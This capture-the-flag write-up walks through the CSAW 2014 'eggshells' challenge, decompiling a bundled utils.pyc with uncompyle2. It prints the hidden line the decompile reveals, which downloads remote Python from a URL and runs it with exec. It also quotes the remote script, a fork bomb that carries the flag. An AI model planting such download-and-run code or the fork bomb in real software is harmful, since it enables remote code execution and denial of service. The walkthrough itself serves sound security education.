# eggshells

Full disclosure, this challenge relies off of a website that no longer has the flag, however this writeups will still show you how to get to that point.

So we are given a zip file. Let's extract it and see what's inside:

```
$	unzip -D eggshells-master.zip 
Archive:  eggshells-master.zip
   creating: eggshells-master/
  inflating: eggshells-master/.DS_Store  
   creating: __MACOSX/
   creating: __MACOSX/eggshells-master/
  inflating: __MACOSX/eggshells-master/._.DS_Store  
  inflating: eggshells-master/.gitattributes  
  inflating: __MACOSX/eggshells-master/._.gitattributes  
  inflating: eggshells-master/.gitignore  
  inflating: __MACOSX/eggshells-master/._.gitignore  
  inflating: eggshells-master/capstone.py  
  inflating: __MACOSX/eggshells-master/._capstone.py  
  inflating: eggshells-master/distorm.py  
  inflating: __MACOSX/eggshells-master/._distorm.py  
  inflating: eggshells-master/interpreter.py  
  inflating: __MACOSX/eggshells-master/._interpreter.py  
  inflating: eggshells-master/main.py  
  inflating: __MACOSX/eggshells-master/._main.py  
   creating: eggshells-master/nasm/
  inflating: eggshells-master/nasm/.DS_Store  
   creating: __MACOSX/eggshells-master/nasm/
  inflating: __MACOSX/eggshells-master/nasm/._.DS_Store  
  inflating: eggshells-master/nasm/LICENSE  
  inflating: __MACOSX/eggshells-master/nasm/._LICENSE  
  inflating: eggshells-master/nasm/nasm.exe  
  inflating: __MACOSX/eggshells-master/nasm/._nasm.exe  
  inflating: eggshells-master/nasm/ndisasm.exe  
  inflating: __MACOSX/eggshells-master/nasm/._ndisasm.exe  
   creating: eggshells-master/nasm/rdoff/
  inflating: eggshells-master/nasm/rdoff/ldrdf.exe  
   creating: __MACOSX/eggshells-master/nasm/rdoff/
  inflating: __MACOSX/eggshells-master/nasm/rdoff/._ldrdf.exe  
  inflating: eggshells-master/nasm/rdoff/rdf2bin.exe  
  inflating: __MACOSX/eggshells-master/nasm/rdoff/._rdf2bin.exe  
  inflating: eggshells-master/nasm/rdoff/rdf2com.exe  
  inflating: __MACOSX/eggshells-master/nasm/rdoff/._rdf2com.exe  
  inflating: eggshells-master/nasm/rdoff/rdf2ihx.exe  
  inflating: __MACOSX/eggshells-master/nasm/rdoff/._rdf2ihx.exe  
  inflating: eggshells-master/nasm/rdoff/rdf2ith.exe  
  inflating: __MACOSX/eggshells-master/nasm/rdoff/._rdf2ith.exe  
  inflating: eggshells-master/nasm/rdoff/rdf2srec.exe  
  inflating: __MACOSX/eggshells-master/nasm/rdoff/._rdf2srec.exe  
  inflating: eggshells-master/nasm/rdoff/rdfdump.exe  
  inflating: __MACOSX/eggshells-master/nasm/rdoff/._rdfdump.exe  
  inflating: eggshells-master/nasm/rdoff/rdflib.exe  
  inflating: __MACOSX/eggshells-master/nasm/rdoff/._rdflib.exe  
  inflating: eggshells-master/nasm/rdoff/rdx.exe  
  inflating: __MACOSX/eggshells-master/nasm/rdoff/._rdx.exe  
  inflating: __MACOSX/eggshells-master/nasm/._rdoff  
  inflating: __MACOSX/eggshells-master/._nasm  
  inflating: eggshells-master/nasm.py  
  inflating: __MACOSX/eggshells-master/._nasm.py  
  inflating: eggshells-master/server.py  
  inflating: __MACOSX/eggshells-master/._server.py  
  inflating: eggshells-master/shellcode.py  
  inflating: __MACOSX/eggshells-master/._shellcode.py  
  inflating: eggshells-master/utils.pyc  
  inflating: eggshells-master/wrapper.py  
  inflating: __MACOSX/eggshells-master/._wrapper.py  
  inflating: __MACOSX/._eggshells-master  
$	ls
eggshells-master  eggshells-master.zip  __MACOSX
$	ls eggshells-master
capstone.py  interpreter.py  nasm     server.py     utils.pyc
distorm.py   main.py         nasm.py  shellcode.py  wrapper.py
```

So inside of the zip, we can see several python scripts, a directory, and compiled python code `utils.pyc`. Looking at a couple of the python scripts such as `server.py`, or `main.py` we can see that they all `import utils` so that the compiled python code is used in all of them. 

We can decompyle the python code using Uncompyle2, which can be found here:

```
https://github.com/wibiti/uncompyle2
```

To install it, is fairly simple. First clone the repo:

```
$	https://github.com/wibiti/uncompyle2.git
```

Then run the install script:

```
$	cd uncompyle2/
$	sudo python setup.py install
```

If you want to see all possible commands:
```
$	uncompyle2 -h
```

And now to decompile the `utils.pyc` file:
```
uncompyle2 utils.pyc 
# 2017.08.21 19:45:51 EDT
#Embedded file name: /Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.py
exec __import__('urllib2').urlopen('http://kchung.co/lol.py').read()
+++ okay decompyling utils.pyc 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2017.08.21 19:45:51 EDT
```

So all this does essentially is it reads the url `http://kchung.co/lol.py`. When we curl it, we get this error (and when we access it with a web browser, it just redirects us to http://kchung.co)

```
$	curl http://kchung.co/lol.py
<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.4.6 (Ubuntu)</center>
</body>
</html>
```

The original python script used for the challenge was taken down. However durring the competition, if you curled that web address, you would of gotten the flag (and a forkbomb). I got this information from `https://github.com/ctfs/write-ups-2014/tree/master/csaw-ctf-2014/eggshells`:

```
$	curl 'http://kchung.co/lol.py'
import os
while True:
    try:
        os.fork()
    except:
        os.system('start')
# flag{trust_is_risky}
```

Just like that, we got the flag.
